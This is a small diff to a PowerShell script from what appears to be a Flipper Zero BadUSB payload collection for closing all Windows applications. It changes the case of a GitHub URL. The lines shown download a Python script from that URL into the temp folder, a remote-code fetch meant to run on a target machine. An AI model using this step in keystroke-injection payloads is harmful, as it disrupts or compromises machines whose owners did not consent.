@@ -1,5 +1,5 @@
 # Download Python script
-$scriptUrl = "https://raw.githubusercontent.com/aleff-github/my-flipper-shits/main/%5BBadUSB%5D%20Close%20All%20Applications%20-%20Windows/script.py"
+$scriptUrl = "https://raw.githubusercontent.com/aleff-github/my-flipper-shits/main/%5BBADUSB%5D%20Close%20All%20Applications%20-%20Windows/script.py"
 $savePath = "$env:temp\script.py"
 (New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)
 
